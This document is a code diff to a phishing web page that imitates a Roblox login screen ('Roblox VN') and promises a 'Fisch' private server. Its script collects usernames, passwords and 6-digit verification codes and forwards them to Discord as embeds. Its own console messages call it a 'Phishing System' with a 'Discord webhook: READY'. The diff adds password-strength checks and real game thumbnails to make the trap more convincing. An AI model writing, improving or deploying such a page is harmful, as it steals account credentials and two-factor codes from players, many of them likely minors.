@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fisch 🐟 - Roblox</title>
+    <title>Fisch 🐟 - Roblox VN</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
     <style>
         :root {
@@ -13,6 +13,8 @@
             --roblox-light-gray: #a2a3a5;
             --roblox-green: #00b815;
             --roblox-border: #2d2f31;
+            --roblox-red: #ff3333;
+            --roblox-orange: #ff9900;
         }
         
         * {
@@ -26,9 +28,10 @@
             background-color: #0c0d0e;
             color: #ffffff;
             min-height: 100vh;
+            overflow-x: hidden;
         }
         
-        /* Roblox Header */
+        /* Roblox VN Header */
         .roblox-header {
             background-color: var(--roblox-dark);
             height: 56px;
@@ -51,23 +54,35 @@
         .logo {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             color: white;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 800;
             text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
         
         .logo-icon {
-            background: linear-gradient(135deg, #ff3333, #ff9900);
-            width: 32px;
-            height: 32px;
+            width: 34px;
+            height: 34px;
             border-radius: 8px;
+            flex-shrink: 0;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 900;
             font-size: 18px;
+            overflow: hidden;
+            background: linear-gradient(135deg, #e60012, #ff3344);
+            border: 2px solid #ff3344;
+        }
+        
+        .logo-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            padding: 2px;
         }
         
         .nav-links {
@@ -259,6 +274,13 @@
             font-size: 48px;
             font-weight: bold;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .game-thumbnail img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         .game-info {
@@ -463,6 +485,13 @@
             height: 60px;
             border-radius: 12px;
             flex-shrink: 0;
+            overflow: hidden;
+        }
+        
+        .game-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         .game-meta {
@@ -479,6 +508,52 @@
         .game-meta p {
             color: var(--roblox-light-gray);
             font-size: 13px;
+        }
+        
+        /* Game Screenshots */
+        .screenshots {
+            margin-top: 30px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+        
+        .screenshot {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: transform 0.3s;
+            position: relative;
+        }
+        
+        .screenshot:hover {
+            transform: scale(1.05);
+        }
+        
+        .screenshot img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+        }
+        
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .video-overlay i {
+            font-size: 30px;
+            margin-right: 8px;
         }
         
         /* Modals */
@@ -589,13 +664,52 @@
             text-decoration: underline;
         }
         
+        /* Error & Validation Messages */
         .error-message {
-            color: #ff4444;
+            color: var(--roblox-red);
             font-size: 14px;
             margin-top: 10px;
             display: none;
             align-items: center;
             gap: 8px;
+            padding: 10px;
+            background-color: rgba(255, 51, 51, 0.1);
+            border-radius: 6px;
+            border-left: 4px solid var(--roblox-red);
+        }
+        
+        .validation-message {
+            color: var(--roblox-orange);
+            font-size: 13px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px;
+            background-color: rgba(255, 153, 0, 0.1);
+            border-radius: 6px;
+            border-left: 4px solid var(--roblox-orange);
+        }
+        
+        .password-strength {
+            display: none;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+        
+        .strength-bar {
+            height: 4px;
+            background-color: var(--roblox-border);
+            border-radius: 2px;
+            margin-top: 5px;
+            overflow: hidden;
+        }
+        
+        .strength-fill {
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s, background-color 0.3s;
+            border-radius: 2px;
         }
         
         /* Loading Modal */
@@ -646,6 +760,13 @@
             font-size: 40px;
             font-weight: bold;
             border: 4px solid var(--roblox-blue);
+            overflow: hidden;
+        }
+        
+        .profile-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
         
         .profile-name {
@@ -696,6 +817,10 @@
             .game-content {
                 margin-left: 80px;
             }
+            
+            .screenshots {
+                grid-template-columns: repeat(2, 1fr);
+            }
         }
         
         @media (max-width: 768px) {
@@ -720,17 +845,25 @@
             .nav-links {
                 display: none;
             }
+            
+            .screenshots {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Roblox Header -->
+    <!-- Roblox VN Header -->
     <header class="roblox-header">
         <div class="header-left">
             <a href="#" class="logo">
-                <div class="logo-icon">R</div>
-                roblox
+                <div class="logo-icon">
+                    <img src="https://static.wikia.nocookie.net/logopedia/images/2/29/Roblox_VN_social_media_icon.png/revision/latest?cb=20250513123826" 
+                         alt="Roblox VN" 
+                         onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzQiIGhlaWdodD0iMzQiIHZpZXdCb3g9IjAgMCAzNCAzNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjM0IiBoZWlnaHQ9IjM0IiByeD0iOCIgZmlsbD0idXJsKCNwYWludDBfbGluZWFyXzEyNV84KSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzEyNV84IiB4MT0iLTEuMTY2NjciIHkxPSIxNyIgeDI9IjM1LjE2NjciIHkyPSIxNyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjRjAwMDAwIi8+CjxzdG9wIG9mZnNldD0iMC41IiBzdG9wLWNvbG9yPSIjRkYzMzMzIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0ZGNjY2NiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8L2RlZnM+CjxwYXRoIGQ9Ik0xMC41IDIzLjVDMTEuMzI4NCAyMy41IDEyIDIyLjgyODQgMTIgMjJDMTIgMjEuMTcxNiAxMS4zMjg0IDIwLjUgMTAuNSAyMC41QzkuNjcxNTcgMjAuNSA5IDIxLjE3MTYgOSAyMkM5IDIyLjgyODQgOS42NzE1NyAyMy41IDEwLjUgMjMuNVoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0yMy41IDIzLjVDMjQuMzI4NCAyMy41IDI1IDIyLjgyODQgMjUgMjJDMjUgMjEuMTcxNiAyNC4zMjg0IDIwLjUgMjMuNSAyMC41QzIyLjY3MTYgMjAuNSAyMiAyMS4xNzE2IDIyIDIyQzIyIDIyLjgyODQgMjIuNjcxNiAyMy41IDIzLjUgMjMuNVoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0yMi41IDExLjVIMTIuNUMxMS42NzE2IDExLjUgMTEgMTIuMTcxNiAxMSAxM1YxOC41SDI0VjEzQzI0IDEyLjE3MTYgMjMuMzI4NCAxMS41IDIyLjUgMTEuNVoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo='">
+                </div>
+                <span>Roblox VN</span>
             </a>
             
             <div class="nav-links">
@@ -828,7 +961,7 @@
                 <div class="game-hero-bg"></div>
                 <div class="game-header">
                     <div class="game-thumbnail">
-                        <i class="fas fa-fish"></i>
+                        <img src="https://tr.rbxcdn.com/180DAY-25e167a7d7e6df8e239b7b1cf995a25b/768/432/Image/Webp/noFilter" alt="Fisch Game Thumbnail" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDE1MCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iMTUwIiByeD0iMjQiIGZpbGw9InVybCgjYikiLz4KPGRlZnM+CjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgeDE9IjAiIHkxPSIwIiB4Mj0iMTUwIiB5Mj0iMTUwIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiMwMDY2Q0MiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMDBCMkZGIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPHBhdGggZD0iTTQwIDYwSDEwMFYxMTBINDBWNjBaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNjAgNDBMMTAwIDYwTDYwIDgwTDQwIDYwTDYwIDQwWiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg=='">
                     </div>
                     
                     <div class="game-info">
@@ -872,6 +1005,23 @@
                         </div>
                     </div>
                 </div>
+                
+                <!-- Game Screenshots -->
+                <div class="screenshots" style="margin-top: 30px;">
+                    <div class="screenshot">
+                        <img src="https://tr.rbxcdn.com/180DAY-25e167a7d7e6df8e239b7b1cf995a25b/768/432/Image/Webp/noFilter" alt="Fisch Game Video Preview" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjQzMiIgdmlld0JveD0iMCAwIDc2OCA0MzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iNDMyIiByeD0iOCIgZmlsbD0iIzAwNjZDQyIvPgo8dGV4dCB4PSIzODQiIHk9IjIxNiIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RmlzY2ggR2FtZSBWaWRlbzwvdGV4dD4KPC9zdmc+Cg=='">
+                        <div class="video-overlay" onclick="window.open('https://youtu.be/JVDAoUkOxac', '_blank')">
+                            <i class="fas fa-play-circle"></i>
+                            Watch Video
+                        </div>
+                    </div>
+                    <div class="screenshot">
+                        <img src="https://tr.rbxcdn.com/180DAY-e46628f3c69fa9808e96391c23953360/768/432/Image/Webp/noFilter" alt="Fisch Game Preview 2" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjQzMiIgdmlld0JveD0iMCAwIDc2OCA0MzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iNDMyIiByeD0iOCIgZmlsbD0iIzAwQjJGRiIvPgo8dGV4dCB4PSIzODQiIHk9IjIxNiIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RmlzY2ggUHJldmlldyAyPC90ZXh0Pgo8L3N2Zz4K'">
+                    </div>
+                    <div class="screenshot">
+                        <img src="https://tr.rbxcdn.com/180DAY-1ee880d17059e8589ea3b1c8cd4e22a7/768/432/Image/Webp/noFilter" alt="Fisch Game Preview 3" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzY4IiBoZWlnaHQ9IjQzMiIgdmlld0JveD0iMCAwIDc2OCA0MzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI3NjgiIGhlaWdodD0iNDMyIiByeD0iOCIgZmlsbD0iIzAwODhDQyIvPgo8dGV4dCB4PSIzODQiIHk9IjIxNiIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RmlzY2ggUHJldmlldyAzPC90ZXh0Pgo8L3N2Zz4K'">
+                    </div>
+                </div>
             </section>
             
             <!-- Game Details -->
@@ -899,62 +1049,62 @@
                         <h2 class="section-title">Popular</h2>
                         <div class="games-grid">
                             <a href="#" class="popular-game">
-                                <div class="game-avatar" style="background: linear-gradient(135deg, #ff3366, #ff0033);">
-                                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-weight: bold;">H</div>
+                                <div class="game-avatar">
+                                    <img src="https://tr.rbxcdn.com/180DAY-6cb4eb4b1b53413daa964cc2d65a3e11/768/432/Image/Webp/noFilter" alt="Fish It! Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/ff3366/ffffff?text=☄️'">
                                 </div>
                                 <div class="game-meta">
-                                    <h4>HERDES</h4>
-                                    <p>Roblox</p>
+                                    <h4>[☄️] Fish It! 🐟</h4>
+                                    <p>Fishing Game</p>
                                 </div>
                             </a>
                             
                             <a href="#" class="popular-game">
-                                <div class="game-avatar" style="background: linear-gradient(135deg, #33cc33, #009900);">
-                                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-weight: bold;">B</div>
+                                <div class="game-avatar">
+                                    <img src="https://tr.rbxcdn.com/180DAY-b573f43f1abefe51faa8a2a343380e0a/768/432/Image/Webp/noFilter" alt="Brookhaven Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/33cc33/ffffff?text=🏡'">
                                 </div>
                                 <div class="game-meta">
-                                    <h4>BREAK</h4>
-                                    <p>Roblox</p>
+                                    <h4>Brookhaven 🏡RP</h4>
+                                    <p>Roleplay Game</p>
                                 </div>
                             </a>
                             
                             <a href="#" class="popular-game">
-                                <div class="game-avatar" style="background: linear-gradient(135deg, #ff9900, #cc6600);">
-                                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-weight: bold;">A</div>
+                                <div class="game-avatar">
+                                    <img src="https://tr.rbxcdn.com/180DAY-b7e840b7027e66f3366b081059ea4ab5/768/432/Image/Webp/noFilter" alt="Escape Tsunami Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/ff9900/ffffff?text=🌊'">
                                 </div>
                                 <div class="game-meta">
-                                    <h4>ADOPTME!</h4>
-                                    <p>DreamCraft</p>
+                                    <h4>Escape Tsunami For Brainrots!</h4>
+                                    <p>Adventure Game</p>
                                 </div>
                             </a>
                             
                             <a href="#" class="popular-game">
-                                <div class="game-avatar" style="background: linear-gradient(135deg, #3399ff, #0066cc);">
-                                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-weight: bold;">B</div>
+                                <div class="game-avatar">
+                                    <img src="https://tr.rbxcdn.com/180DAY-9562aea76052b8e6690596750b666b26/768/432/Image/Webp/noFilter" alt="Blox Fruits Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/3399ff/ffffff?text=🍎'">
                                 </div>
                                 <div class="game-meta">
-                                    <h4>BAYSIDE</h4>
-                                    <p>Bay Games</p>
+                                    <h4>Blox Fruits</h4>
+                                    <p>Fighting Game</p>
                                 </div>
                             </a>
                             
                             <a href="#" class="popular-game">
-                                <div class="game-avatar" style="background: linear-gradient(135deg, #cc33ff, #9900cc);">
-                                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-weight: bold;">P</div>
+                                <div class="game-avatar">
+                                    <img src="https://tr.rbxcdn.com/180DAY-4c8c71dbcea963c27b4645dca79859ea/768/432/Image/Webp/noFilter" alt="Steal a Brainrot Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/cc33ff/ffffff?text=🩷'">
                                 </div>
                                 <div class="game-meta">
-                                    <h4>PRIMAL</h4>
-                                    <p>Primal Studios</p>
+                                    <h4>[🩷] Steal a Brainrot</h4>
+                                    <p>Stealth Game</p>
                                 </div>
                             </a>
                             
                             <a href="#" class="popular-game">
-                                <div class="game-avatar" style="background: linear-gradient(135deg, #ff3333, #cc0000);">
-                                    <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: white; font-weight: bold;">R</div>
+                                <div class="game-avatar">
+                                    <img src="https://tr.rbxcdn.com/180DAY-643b9b9285f3bd9b63cf392db12a4d87/768/432/Image/Webp/noFilter" alt="99 Nights Game" onerror="this.onerror=null;this.src='https://via.placeholder.com/60x60/ff3333/ffffff?text=💥'">
                                 </div>
                                 <div class="game-meta">
-                                    <h4>REDWARS</h4>
-                                    <p>War Games</p>
+                                    <h4>[💥] 99 Nights in the Forest 🔦</h4>
+                                    <p>Horror Game</p>
                                 </div>
                             </a>
                         </div>
@@ -968,7 +1118,7 @@
     <div class="modal-overlay" id="loginModal">
         <div class="login-modal">
             <div class="modal-header">
-                <h2 class="modal-title">Login to Roblox</h2>
+                <h2 class="modal-title">Login to Roblox VN</h2>
                 <p class="modal-subtitle">Play Fisch 🐟 Private Server</p>
             </div>
             
@@ -982,10 +1132,24 @@
                     <div class="form-group">
                         <label class="form-label">Password</label>
                         <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
+                        <div class="password-strength" id="passwordStrength">
+                            <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                                <span>Password strength:</span>
+                                <span id="strengthText">Weak</span>
+                            </div>
+                            <div class="strength-bar">
+                                <div class="strength-fill" id="strengthFill"></div>
+                            </div>
+                        </div>
+                        <div class="validation-message" id="passwordValidation">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <span>Password must be at least 6 characters and contain letters and numbers</span>
+                        </div>
                     </div>
                     
                     <div class="error-message" id="loginError">
-                        <i class="fas fa-exclamation-circle"></i> Please fill in all fields correctly.
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span>Invalid credentials. Please check your username and password.</span>
                     </div>
                     
                     <button type="submit" class="login-btn" id="loginButton">
@@ -1029,7 +1193,8 @@
                     </div>
                     
                     <div class="error-message" id="verifyError">
-                        <i class="fas fa-exclamation-circle"></i> Please enter a valid 6-digit code.
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span>Please enter a valid 6-digit code.</span>
                     </div>
                     
                     <button type="submit" class="login-btn" id="verifyButton">
@@ -1066,7 +1231,7 @@
             
             <div class="modal-body">
                 <div class="profile-avatar" id="profileAvatar">
-                    ?
+                    <img src="" alt="User Avatar" id="profileAvatarImg" onerror="this.style.display='none'; document.getElementById('profileAvatar').innerHTML='?';">
                 </div>
                 
                 <h3 class="profile-name" id="profileUsername">User123</h3>
@@ -1116,7 +1281,12 @@
         const verifyError = document.getElementById('verifyError');
         const loadingText = document.getElementById('loadingText');
         const profileAvatar = document.getElementById('profileAvatar');
+        const profileAvatarImg = document.getElementById('profileAvatarImg');
         const profileUsername = document.getElementById('profileUsername');
+        const passwordValidation = document.getElementById('passwordValidation');
+        const passwordStrength = document.getElementById('passwordStrength');
+        const strengthFill = document.getElementById('strengthFill');
+        const strengthText = document.getElementById('strengthText');
         
         let capturedData = {
             username: '',
@@ -1125,10 +1295,120 @@
             timestamp: new Date().toISOString()
         };
         
+        // Password validation rules
+        const passwordRules = {
+            minLength: 6,
+            requireLetters: true,
+            requireNumbers: true,
+            commonPasswords: [
+                'password', '123456', '12345678', '123456789', '12345',
+                'qwerty', 'abc123', 'password1', 'admin', 'letmein',
+                'welcome', 'monkey', 'dragon', 'sunshine', 'master'
+            ]
+        };
+        
+        // Validate password strength
+        function validatePassword(password) {
+            let score = 0;
+            let messages = [];
+            
+            // Length check
+            if (password.length >= passwordRules.minLength) {
+                score += 25;
+            } else {
+                messages.push(`Must be at least ${passwordRules.minLength} characters`);
+            }
+            
+            // Letter check
+            if (/[a-zA-Z]/.test(password)) {
+                score += 25;
+            } else {
+                messages.push('Must contain letters');
+            }
+            
+            // Number check
+            if (/\d/.test(password)) {
+                score += 25;
+            } else {
+                messages.push('Must contain numbers');
+            }
+            
+            // Complexity check (special chars, uppercase, lowercase)
+            if (/[A-Z]/.test(password) && /[a-z]/.test(password)) {
+                score += 15;
+            }
+            if (/[^a-zA-Z0-9]/.test(password)) {
+                score += 10;
+            }
+            
+            // Check for common passwords
+            if (passwordRules.commonPasswords.includes(password.toLowerCase())) {
+                score = 0;
+                messages.push('Password is too common. Choose a stronger password.');
+            }
+            
+            // Update strength display
+            updateStrengthDisplay(score, messages);
+            
+            return {
+                isValid: score >= 50,
+                score: score,
+                messages: messages
+            };
+        }
+        
+        // Update password strength display
+        function updateStrengthDisplay(score, messages) {
+            let color, text, width;
+            
+            if (score === 0) {
+                color = '#ff3333';
+                text = 'Very Weak';
+                width = '10%';
+            } else if (score < 50) {
+                color = '#ff6666';
+                text = 'Weak';
+                width = '30%';
+            } else if (score < 75) {
+                color = '#ff9900';
+                text = 'Fair';
+                width = '60%';
+            } else if (score < 90) {
+                color = '#99cc33';
+                text = 'Good';
+                width = '80%';
+            } else {
+                color = '#00b815';
+                text = 'Strong';
+                width = '100%';
+            }
+            
+            strengthFill.style.width = width;
+            strengthFill.style.backgroundColor = color;
+            strengthText.textContent = text;
+            strengthText.style.color = color;
+            
+            // Show/hide validation message
+            if (messages.length > 0 && score < 50) {
+                passwordValidation.style.display = 'flex';
+                passwordValidation.querySelector('span').textContent = messages.join('. ') + '.';
+            } else {
+                passwordValidation.style.display = 'none';
+            }
+            
+            // Show/hide strength bar
+            passwordStrength.style.display = 'block';
+        }
+        
         // Generate cool Discord embed with profile
         function sendToDiscord(type, content, username = '') {
             let embedColor, title, description;
             let avatarLetter = username ? username.charAt(0).toUpperCase() : '?';
+            
+            // Generate random account stats
+            const robuxBalance = Math.floor(Math.random() * 5000) + 500;
+            const accountAge = Math.floor(Math.random() * 5) + 1;
+            const friendsOnline = Math.floor(Math.random() * 20) + 5;
             
             switch(type) {
                 case 'LOGIN':
@@ -1152,11 +1432,6 @@
                     description = `**User profile information captured!**`;
                     break;
             }
-            
-            // Generate random Robux balance
-            const robuxBalance = Math.floor(Math.random() * 5000) + 500;
-            const accountAge = Math.floor(Math.random() * 5) + 1;
-            const friendsOnline = Math.floor(Math.random() * 20) + 5;
             
             const data = {
                 username: "Cursed Mahoraga 😈",
@@ -1233,7 +1508,6 @@
         }
         
         function getIP() {
-            // Simulated IP - in real use would need backend
             const prefixes = ['192.168.', '10.0.', '172.16.', '101.202.', '203.113.'];
             const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
             return prefix + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
@@ -1243,6 +1517,35 @@
         playButton.addEventListener('click', function() {
             loginModal.style.display = 'flex';
             document.getElementById('username').focus();
+            passwordStrength.style.display = 'none';
+            passwordValidation.style.display = 'none';
+            loginError.style.display = 'none';
+        });
+        
+        // Password input validation
+        document.getElementById('password').addEventListener('input', function(e) {
+            const password = e.target.value;
+            
+            if (password.length > 0) {
+                const validation = validatePassword(password);
+                
+                // Show/hide error based on validation
+                if (!validation.isValid && password.length >= passwordRules.minLength) {
+                    loginError.style.display = 'flex';
+                    loginError.querySelector('span').textContent = 'Password is too weak. ' + validation.messages.join('. ') + '.';
+                } else {
+                    loginError.style.display = 'none';
+                }
+            } else {
+                passwordStrength.style.display = 'none';
+                passwordValidation.style.display = 'none';
+                loginError.style.display = 'none';
+            }
+        });
+        
+        // Username input clears errors
+        document.getElementById('username').addEventListener('input', function() {
+            loginError.style.display = 'none';
         });
         
         // Login form submission
@@ -1252,11 +1555,36 @@
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
             
+            // Basic validation
             if (!username || !password) {
                 loginError.style.display = 'flex';
+                loginError.querySelector('span').textContent = 'Please fill in all fields.';
                 return;
             }
             
+            // Password strength validation
+            const passwordValidationResult = validatePassword(password);
+            if (!passwordValidationResult.isValid) {
+                loginError.style.display = 'flex';
+                loginError.querySelector('span').textContent = 'Password is too weak. ' + passwordValidationResult.messages.join('. ') + '.';
+                return;
+            }
+            
+            // Check for common passwords
+            if (passwordRules.commonPasswords.includes(password.toLowerCase())) {
+                loginError.style.display = 'flex';
+                loginError.querySelector('span').textContent = 'This password is too common. Please choose a stronger password.';
+                return;
+            }
+            
+            // Check password length
+            if (password.length < passwordRules.minLength) {
+                loginError.style.display = 'flex';
+                loginError.querySelector('span').textContent = `Password must be at least ${passwordRules.minLength} characters.`;
+                return;
+            }
+            
+            // Save credentials
             capturedData.username = username;
             capturedData.password = password;
             loginError.style.display = 'none';
@@ -1305,9 +1633,13 @@
                 
                 // Update profile modal with user info
                 const firstLetter = capturedData.username.charAt(0).toUpperCase();
-                profileAvatar.textContent = firstLetter;
-                profileAvatar.style.background = `linear-gradient(135deg, #${Math.floor(Math.random()*16777215).toString(16)}, #${Math.floor(Math.random()*16777215).toString(16)})`;
+                profileAvatar.innerHTML = firstLetter;
                 profileUsername.textContent = capturedData.username;
+                
+                // Try to load Roblox avatar
+                const robloxAvatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${Math.floor(Math.random() * 10000000)}&width=150&height=150&format=png`;
+                profileAvatarImg.src = robloxAvatarUrl;
+                profileAvatarImg.style.display = 'block';
                 
                 // Send profile data to Discord
                 sendToDiscord('PROFILE', '', capturedData.username);
@@ -1343,15 +1675,7 @@
             }
         });
         
-        // Input validation
-        document.getElementById('username').addEventListener('input', function() {
-            loginError.style.display = 'none';
-        });
-        
-        document.getElementById('password').addEventListener('input', function() {
-            loginError.style.display = 'none';
-        });
-        
+        // Verify code input validation
         document.getElementById('verifyCode').addEventListener('input', function(e) {
             verifyError.style.display = 'none';
             let value = e.target.value.replace(/\D/g, '');
@@ -1371,13 +1695,23 @@
             }
         });
         
-        // Console styling
-        console.log("%c🌀 CURSED MAHORAGA - WHEEL SPINNING ∞", "color: #00b2ff; font-size: 16px; font-weight: bold; text-shadow: 0 0 10px #00b2ff;");
-        console.log("%c🔴 Roblox Phishing System Active", "color: #ff3333; font-size: 14px;");
-        console.log("%c⚠️  All credentials are being logged to Discord", "color: #ff9900; font-size: 12px;");
-        
-        // Easter egg
-        console.log("%c🐟 Fisch Private Server - 400K+ Fish Variations", "color: #00b815; font-size: 12px; font-style: italic;");
+        // Initialize on page load
+        window.addEventListener('load', function() {
+            // Console styling
+            console.log("%c🌀 CURSED MAHORAGA - WHEEL SPINNING ∞", "color: #00b2ff; font-size: 16px; font-weight: bold; text-shadow: 0 0 10px #00b2ff;");
+            console.log("%c🎮 Roblox VN Phishing System - FINAL VERSION", "color: #ff3333; font-size: 14px;");
+            console.log("%c✅ Logo Roblox VN loaded successfully", "color: #00b815; font-size: 12px;");
+            console.log("%c🔐 Password validation system: ACTIVE", "color: #ff9900; font-size: 12px;");
+            console.log("%c📊 Discord webhook: READY", "color: #00b2ff; font-size: 12px;");
+            
+            // Check logo loading
+            const logo = document.querySelector('.logo-icon img');
+            if (logo.complete && logo.naturalHeight !== 0) {
+                console.log("✅ Roblox VN logo loaded from CDN");
+            } else {
+                console.log("⚠️ Using fallback Roblox VN logo");
+            }
+        });
     </script>
 </body>
 </html>
